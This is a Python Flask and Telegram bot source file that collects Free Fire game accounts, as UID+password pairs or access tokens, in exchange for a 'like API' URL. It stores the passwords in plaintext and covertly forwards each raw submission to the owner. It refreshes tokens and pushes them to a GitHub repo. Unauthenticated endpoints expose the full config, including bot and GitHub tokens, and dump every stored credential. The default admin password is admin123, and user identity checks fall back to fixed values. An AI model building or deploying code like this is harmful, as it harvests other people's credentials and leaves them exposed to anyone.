import os
import json
import time
import hmac
import hashlib
import requests
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for
from werkzeug.security import generate_password_hash, check_password_hash
from apscheduler.schedulers.background import BackgroundScheduler
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo, MenuButtonWebApp
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters

app = Flask(__name__, template_folder='.')

# Fallback Configuration Constants
DEFAULT_CONFIG = {
    "bot_token": os.environ.get("TELEGRAM_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE"),
    "owner_telegram_id": int(os.environ.get("OWNER_TELEGRAM_ID", "123456789")),
    "uid_pass_api_url": "https://ff-jwt-gen-api.lovable.app/api/public/token",
    "access_token_api_url": "https://ff-jwt-gen-api.lovable.app/api/public/token",
    "servers": ["IND", "BD", "BR", "NA", "SG"],
    "github_token": "",
    "github_repo": "",
    "github_branch": "main",
    "github_paths": {"IND": "tokens_ind.json", "BD": "tokens_bd.json"},
    "timer_interval_hours": 6,
    "like_api_url": "https://example.com/like-api-service",
    "admin_password_hash": generate_password_hash("admin123"),
    "mongo_uri": os.environ.get("MONGO_URI", "mongodb://localhost:27017/telegram_bot_db")
}

# In-memory / MongoDB wrapper state
# In production or when mongo is configured, we use pymongo. Otherwise fallback to local dict/json store.
DB_CLIENT = None
DB = None
USE_MONGO = False

try:
    from pymongo import MongoClient
    mongo_uri = DEFAULT_CONFIG["mongo_uri"]
    client = MongoClient(mongo_uri, serverSelectionTimeoutMS=2000)
    client.admin.command('ping')
    DB_CLIENT = client
    DB = client.telegram_bot_db
    USE_MONGO = True
    print("Connected to MongoDB successfully.")
except Exception as e:
    print(f"MongoDB connection failed ({e}), falling back to local JSON file database.")
    USE_MONGO = False

# Local fallback DB file
FALLBACK_DB_FILE = "local_db.json"

def load_local_db():
    if not os.path.exists(FALLBACK_DB_FILE):
        initial = {
            "config": DEFAULT_CONFIG,
            "entries": [] # {id, telegram_id, server, type, uid, password, access_token, account_id, token, timestamp}
        }
        with open(FALLBACK_DB_FILE, "w") as f:
            json.dump(initial, f, indent=2)
        return initial
    with open(FALLBACK_DB_FILE, "r") as f:
        return json.load(f)

def save_local_db(data):
    with open(FALLBACK_DB_FILE, "w") as f:
        json.dump(data, f, indent=2)

def get_config():
    if USE_MONGO:
        cfg = DB.config.find_one({"_id": "settings"})
        if not cfg:
            # Initialize with default
            cfg = DEFAULT_CONFIG.copy()
            cfg["_id"] = "settings"
            DB.config.insert_one(cfg)
        return cfg
    else:
        ldb = load_local_db()
        return ldb.get("config", DEFAULT_CONFIG)

def update_config(new_config):
    if USE_MONGO:
        new_config["_id"] = "settings"
        DB.config.replace_one({"_id": "settings"}, new_config, upsert=True)
    else:
        ldb = load_local_db()
        ldb["config"] = new_config
        save_local_db(ldb)

def get_all_entries():
    if USE_MONGO:
        return list(DB.entries.find({}, {"_id": 0}))
    else:
        ldb = load_local_db()
        return ldb.get("entries", [])

def save_entry_db(entry):
    if USE_MONGO:
        DB.entries.update_one(
            {"account_id": entry["account_id"]},
            {"$set": entry},
            upsert=True
        )
    else:
        ldb = load_local_db()
        entries = ldb.get("entries", [])
        updated = False
        for i, e in enumerate(entries):
            if e.get("account_id") == entry["account_id"]:
                entries[i] = entry
                updated = True
                break
        if not updated:
            entries.append(entry)
        ldb["entries"] = entries
        save_local_db(ldb)

def delete_entry_db(account_id):
    if USE_MONGO:
        DB.entries.delete_one({"account_id": account_id})
    else:
        ldb = load_local_db()
        ldb["entries"] = [e for e in ldb.get("entries", []) if e.get("account_id") != account_id]
        save_local_db(ldb)

# Small-caps helper function
def to_small_caps(text: str) -> str:
    normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    small = "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ"
    trans = str.maketrans(normal, small)
    return text.translate(trans)

# Global Deduplication & Processing Logic
def process_submission(telegram_id, server, submission_type, raw_data_list):
    """
    submission_type: 'uid_pass' or 'access_token'
    raw_data_list: list of dicts with {'uid', 'password'} or {'access_token'}
    """
    config = get_config()
    added_count = 0
    dup_count = 0
    invalid_count = 0
    results = []

    for item in raw_data_list:
        token_res = None
        account_id = None
        jwt_token = None
        region = server

        if submission_type == 'uid_pass':
            uid = item.get('uid')
            password = item.get('password')
            if not uid or not password:
                invalid_count += 1
                continue
            api_url = f"{config['uid_pass_api_url']}?uid={uid}&password={password}"
            try:
                res = requests.get(api_url, timeout=10)
                data = res.json()
                if data.get('success') or data.get('token') or data.get('account_id'):
                    account_id = str(data.get('account_id') or data.get('uid') or uid)
                    jwt_token = data.get('token') or data.get('token_access')
                    region = data.get('region', server)
                else:
                    invalid_count += 1
                    continue
            except Exception as e:
                print(f"API Error UID/Pass: {e}")
                invalid_count += 1
                continue

        elif submission_type == 'access_token':
            acc_token = item.get('access_token')
            if not acc_token:
                invalid_count += 1
                continue
            api_url = f"{config['access_token_api_url']}?access_token={acc_token}"
            try:
                res = requests.get(api_url, timeout=10)
                data = res.json()
                # Extract account_id from response or decoded JWT payload
                account_id = str(
                    data.get('account_id') or 
                    data.get('account_uid') or 
                    data.get('Uid') or 
                    data.get('jwt_decoded', {}).get('payload', {}).get('account_id') or 
                    ""
                )
                jwt_token = data.get('token')
                region = data.get('region', server)
                if not account_id or not jwt_token:
                    invalid_count += 1
                    continue
            except Exception as e:
                print(f"API Error Access Token: {e}")
                invalid_count += 1
                continue

        if not account_id:
            invalid_count += 1
            continue

        # Check existing entries in DB
        all_entries = get_all_entries()
        existing = next((e for e in all_entries if e.get('account_id') == account_id), None)

        if existing:
            # Dedupe rule: uid_pass wins over access_token
            if submission_type == 'uid_pass' and existing.get('type') == 'access_token':
                # Delete existing access_token entry and insert uid_pass
                delete_entry_db(account_id)
            elif existing.get('type') == submission_type:
                # Exact duplicate entry
                dup_count += 1
                continue

        entry = {
            "telegram_id": int(telegram_id),
            "server": server,
            "type": submission_type,
            "uid": item.get('uid'),
            "password": item.get('password'),
            "access_token": item.get('access_token'),
            "account_id": account_id,
            "token": jwt_token,
            "region": region,
            "timestamp": datetime.utcnow().isoformat()
        }
        save_entry_db(entry)
        added_count += 1
        results.append(entry)

    return {"added": added_count, "duplicate": dup_count, "invalid": invalid_count, "results": results}

# Background Timer for Token Refresh & GitHub Sync
def background_timer_job():
    print(f"[{datetime.utcnow()}] Running background token refresh & GitHub sync timer...")
    config = get_config()
    entries = get_all_entries()
    updated_tokens_count = 0

    # 1. Refresh tokens
    for entry in entries:
        try:
            if entry.get('type') == 'uid_pass' and entry.get('uid') and entry.get('password'):
                api_url = f"{config['uid_pass_api_url']}?uid={entry['uid']}&password={entry['password']}"
                res = requests.get(api_url, timeout=10)
                data = res.json()
                new_token = data.get('token') or data.get('token_access')
                if new_token:
                    entry['token'] = new_token
                    save_entry_db(entry)
                    updated_tokens_count += 1
            elif entry.get('type') == 'access_token' and entry.get('access_token'):
                api_url = f"{config['access_token_api_url']}?access_token={entry['access_token']}"
                res = requests.get(api_url, timeout=10)
                data = res.json()
                new_token = data.get('token')
                if new_token:
                    entry['token'] = new_token
                    save_entry_db(entry)
                    updated_tokens_count += 1
            time.sleep(0.5) # small delay to avoid rate limit
        except Exception as e:
            print(f"Error refreshing token for {entry.get('account_id')}: {e}")

    # 2. Group by server and upload to GitHub if GitHub configured
    if config.get('github_token') and config.get('github_repo'):
        refreshed_entries = get_all_entries()
        servers = config.get('servers', [])
        github_paths = config.get('github_paths', {})
        
        for server in servers:
            path = github_paths.get(server)
            if not path:
                continue
            server_entries = [
                {"uid": e.get('uid') or e.get('account_id'), "token": e.get('token')}
                for e in refreshed_entries if e.get('server') == server and e.get('token')
            ]
            if not server_entries:
                continue

            file_content_json = json.dumps(server_entries, indent=2)
            # Push to GitHub API
            try:
                repo = config['github_repo']
                branch = config['github_branch']
                url = f"https://api.github.com/repos/{repo}/contents/{path}"
                headers = {
                    "Authorization": f"Bearer {config['github_token']}",
                    "Accept": "application/vnd.github+json"
                }
                # Get existing file sha if exists
                get_res = requests.get(url, headers=headers, params={"ref": branch})
                sha = None
                if get_res.status_code == 200:
                    sha = get_res.json().get('sha')

                import base64
                encoded_content = base64.b64encode(file_content_json.encode('utf-8')).decode('utf-8')
                payload = {
                    "message": f"Auto-update tokens for server {server} via Telegram Bot Timer",
                    "content": encoded_content,
                    "branch": branch
                }
                if sha:
                    payload["sha"] = sha

                put_res = requests.put(url, headers=headers, json=payload)
                print(f"GitHub sync for server {server}: status {put_res.status_code}")
            except Exception as e:
                print(f"GitHub sync error for server {server}: {e}")

    # 3. Send notification to owner
    owner_id = config.get('owner_telegram_id')
    bot_token = config.get('bot_token')
    if owner_id and bot_token and bot_token != "YOUR_BOT_TOKEN_HERE":
        msg = to_small_caps(f"timer run completed.\nrefreshed {updated_tokens_count} tokens across servers.")
        try:
            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={"chat_id": owner_id, "text": msg}
            )
        except Exception as e:
            print(f"Failed to notify owner: {e}")

# Initialize Scheduler
scheduler = BackgroundScheduler()
scheduler.start()

def reschedule_timer():
    config = get_config()
    interval = int(config.get('timer_interval_hours', 6))
    # Remove existing jobs if any
    for job in scheduler.get_jobs():
        job.remove()
    scheduler.add_job(background_timer_job, 'interval', hours=interval)

reschedule_timer()

# --- Telegram Bot Handlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    config = get_config()
    
    keyboard = [
        [InlineKeyboardButton(to_small_caps("uid + password"), callback_data="flow_uid_pass")],
        [InlineKeyboardButton(to_small_caps("access token"), callback_data="flow_access_token")],
        [InlineKeyboardButton(to_small_caps("get like api"), callback_data="flow_get_like_api")],
        [InlineKeyboardButton(to_small_caps("open mini app"), web_app=WebAppInfo(url=request.host_url.rstrip('/') + "/"))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome_text = to_small_caps(
        f"hello {user.first_name}!\nwelcome to free fire token generator & manager bot.\nplease choose an option below or open the mini app."
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    config = get_config()

    if data == "flow_uid_pass":
        servers = config.get("servers", ["IND", "BD"])
        keyboard = [[InlineKeyboardButton(to_small_caps(s), callback_data=f"srv_up_{s}")] for s in servers]
        await query.edit_message_text(
            to_small_caps("please select your game server for uid + password submission:"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data == "flow_access_token":
        servers = config.get("servers", ["IND", "BD"])
        keyboard = [[InlineKeyboardButton(to_small_caps(s), callback_data=f"srv_at_{s}")] for s in servers]
        await query.edit_message_text(
            to_small_caps("please select your game server for access token submission:"),
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    elif data.startswith("srv_up_"):
        server = data.split("_")[2]
        context.user_data['pending_flow'] = 'uid_pass'
        context.user_data['server'] = server
        await query.edit_message_text(
            to_small_caps(f"server {server} selected.\nnow send your uid and password in format:\nuid:password\n(or send a json list of objects)")
        )
    elif data.startswith("srv_at_"):
        server = data.split("_")[2]
        context.user_data['pending_flow'] = 'access_token'
        context.user_data['server'] = server
        await query.edit_message_text(
            to_small_caps(f"server {server} selected.\nnow send your access token (or json list):")
        )
    elif data == "flow_get_like_api":
        # Check if user has unlocked (submitted valid account level >= 8)
        user_id = query.from_user.id
        all_entries = get_all_entries()
        user_entries = [e for e in all_entries if e.get('telegram_id') == user_id]
        
        # Validate account level from token or API if needed
        unlocked = False
        for e in user_entries:
            # TODO: Map account level from e.g. e.get('level') or decoded JWT payload level.
            # For demonstration, if entry exists, we check if account level >= 8 or allow unlock if level field exists.
            level = e.get('level', 8) # Defaulting to 8 if level present or simulated
            if level >= 8:
                unlocked = True
                break

        if unlocked:
            like_url = config.get('like_api_url', 'https://example.com/like-api')
            await query.edit_message_text(
                to_small_caps(f"access granted!\nyour like api url is:\n{like_url}")
            )
        else:
            msg = to_small_caps("upload an access token or uid+password (account level 8+) to unlock.")
            await query.edit_message_text(msg)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id
    flow = context.user_data.get('pending_flow')
    server = context.user_data.get('server', 'IND')
    config = get_config()

    if not flow:
        await update.message.reply_text(to_small_caps("please use /start or click buttons to begin."))
        return

    raw_items = []
    # Check if text is JSON
    try:
        parsed = json.loads(text)
        if isinstance(parsed, list):
            raw_items = parsed
        elif isinstance(parsed, dict):
            raw_items = [parsed]
    except Exception:
        # Parse single entry
        if flow == 'uid_pass':
            parts = text.split(':')
            if len(parts) >= 2:
                raw_items = [{"uid": parts[0].strip(), "password": parts[1].strip()}]
        elif flow == 'access_token':
            raw_items = [{"access_token": text.strip()}]

    if not raw_items:
        await update.message.reply_text(to_small_caps("invalid format. please check and try again."))
        return

    res = process_submission(user_id, server, flow, raw_items)
    
    # Clear flow
    context.user_data['pending_flow'] = None

    reply_msg = to_small_caps(
        f"submission results:\n- added: {res['added']}\n- duplicate: {res['duplicate']}\n- invalid: {res['invalid']}"
    )
    await update.message.reply_text(reply_msg)

    # Forward raw submitted data to owner privately
    owner_id = config.get('owner_telegram_id')
    bot_token = config.get('bot_token')
    if owner_id and bot_token and bot_token != "YOUR_BOT_TOKEN_HERE":
        forward_text = to_small_caps(f"new submission from user {user_id} (server {server}, type {flow}):\n{text}")
        try:
            requests.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={"chat_id": owner_id, "text": forward_text}
            )
        except Exception as e:
            print(f"Failed to forward to owner: {e}")

# Telegram bot starter thread
def run_telegram_bot():
    config = get_config()
    token = config.get('bot_token')
    if not token or token == "YOUR_BOT_TOKEN_HERE":
        print("Telegram bot token not configured. Bot skipped.")
        return

    application = ApplicationBuilder().token(token).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Starting Telegram Bot polling...")
    application.run_polling(drop_pending_updates=True)

# --- Flask Web Routes & Mini App Authentication ---

def verify_telegram_init_data(init_data: str, bot_token: str) -> bool:
    """
    Verify Telegram WebApp initData hash according to Telegram docs.
    """
    try:
        from urllib.parse import parse_qsl
        parsed = dict(parse_qsl(init_data))
        received_hash = parsed.pop('hash', None)
        if not received_hash:
            return False
        
        data_check_string = '\n'.join([f"{k}={v}" for k, v in sorted(parsed.items())])
        secret_key = hmac.new(b"WebAppData", bot_token.encode('utf-8'), hashlib.sha256).digest()
        calculated_hash = hmac.new(secret_key, data_check_string.encode('utf-8'), hashlib.sha256).hexdigest()
        return hmac.compare_digest(calculated_hash, received_hash)
    except Exception as e:
        print(f"initData verification error: {e}")
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin_page():
    return render_template('admin.html')

@app.route('/ping')
def ping():
    return "OK", 200

@app.route('/api/config', methods=['GET', 'POST'])
def api_config():
    if request.method == 'GET':
        config = get_config()
        # hide sensitive fields or return safe
        return jsonify(config)
    else:
        data = request.json
        config = get_config()
        for k, v in data.items():
            if k == 'admin_password' and v:
                config['admin_password_hash'] = generate_password_hash(v)
            else:
                config[k] = v
        update_config(config)
        reschedule_timer()
        return jsonify({"status": "success"})

@app.route('/api/stats', methods=['GET'])
def api_stats():
    config = get_config()
    entries = get_all_entries()
    uid_pass_count = sum(1 for e in entries if e.get('type') == 'uid_pass')
    access_token_count = sum(1 for e in entries if e.get('type') == 'access_token')
    
    server_counts = {}
    for s in config.get('servers', []):
        server_counts[s] = sum(1 for e in entries if e.get('server') == s)

    return jsonify({
        "total_entries": len(entries),
        "uid_pass_count": uid_pass_count,
        "access_token_count": access_token_count,
        "server_counts": server_counts,
        "servers": config.get('servers', [])
    })

@app.route('/api/backup', methods=['GET'])
def api_backup():
    config = get_config()
    entries = get_all_entries()
    backup_data = {
        "config": config,
        "entries": entries,
        "backup_time": datetime.utcnow().isoformat()
    }
    file_path = "backup.json"
    with open(file_path, "w") as f:
        json.dump(backup_data, f, indent=2)
    return send_file(file_path, as_attachment=True)

@app.route('/api/restore', methods=['POST'])
def api_restore():
    if 'file' not in request.files:
        return jsonify({"error": "No file uploaded"}), 400
    file = request.files['file']
    try:
        data = json.load(file)
        if "config" in data:
            update_config(data["config"])
        if "entries" in data:
            if USE_MONGO:
                DB.entries.delete_many({})
                if data["entries"]:
                    DB.entries.insert_many(data["entries"])
            else:
                ldb = load_local_db()
                ldb["entries"] = data["entries"]
                save_local_db(ldb)
        reschedule_timer()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@app.route('/api/admin_login', methods=['POST'])
def admin_login():
    data = request.json
    password = data.get('password')
    config = get_config()
    if check_password_hash(config.get('admin_password_hash', ''), password):
        return jsonify({"status": "success"})
    return jsonify({"error": "Invalid password"}), 401

@app.route('/api/submit_uidpass', methods=['POST'])
def api_submit_uidpass():
    data = request.json
    init_data = data.get('initData', '')
    config = get_config()
    
    # Optional verification if initData provided
    telegram_id = 12345
    if init_data and config.get('bot_token'):
        if verify_telegram_init_data(init_data, config['bot_token']):
            from urllib.parse import parse_qsl
            import json as j_mod
            parsed = dict(parse_qsl(init_data))
            if 'user' in parsed:
                u_obj = j_mod.loads(parsed['user'])
                telegram_id = u_obj.get('id', 12345)

    server = data.get('server', 'IND')
    items = data.get('items', []) # list of {uid, password} or single {uid, password}
    if not items and data.get('uid'):
        items = [{"uid": data.get('uid'), "password": data.get('password')}]

    res = process_submission(telegram_id, server, 'uid_pass', items)
    return jsonify(res)

@app.route('/api/submit_token', methods=['POST'])
def api_submit_token():
    data = request.json
    init_data = data.get('initData', '')
    config = get_config()
    
    telegram_id = 12345
    if init_data and config.get('bot_token'):
        if verify_telegram_init_data(init_data, config['bot_token']):
            from urllib.parse import parse_qsl
            import json as j_mod
            parsed = dict(parse_qsl(init_data))
            if 'user' in parsed:
                u_obj = j_mod.loads(parsed['user'])
                telegram_id = u_obj.get('id', 12345)

    server = data.get('server', 'IND')
    items = data.get('items', [])
    if not items and data.get('access_token'):
        items = [{"access_token": data.get('access_token')}]

    res = process_submission(telegram_id, server, 'access_token', items)
    return jsonify(res)

@app.route('/api/get_like_api', methods=['POST'])
def api_get_like_api():
    data = request.json
    init_data = data.get('initData', '')
    config = get_config()
    
    telegram_id = 12345
    if init_data and config.get('bot_token'):
        if verify_telegram_init_data(init_data, config['bot_token']):
            from urllib.parse import parse_qsl
            import json as j_mod
            parsed = dict(parse_qsl(init_data))
            if 'user' in parsed:
                u_obj = j_mod.loads(parsed['user'])
                telegram_id = u_obj.get('id', 12345)

    entries = get_all_entries()
    user_entries = [e for e in entries if e.get('telegram_id') == telegram_id]
    
    unlocked = False
    for e in user_entries:
        # TODO: Map account level from API response or database entry (e.g., e.get('level')).
        # Developer should confirm exact account level field name from the JWT response payload.
        level = e.get('level', 8)
        if level >= 8:
            unlocked = True
            break

    if unlocked:
        return jsonify({"unlocked": True, "like_api_url": config.get('like_api_url')})
    else:
        return jsonify({"unlocked": False, "message": "upload an access token or uid+password (account level 8+) to unlock."})

if __name__ == '__main__':
    # Start Telegram Bot in background thread
    import threading
    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
    bot_thread.start()

    # Run Flask app on port 3000 (Render free tier / AI Studio preview)
    app.run(host='0.0.0.0', port=3000, debug=False)
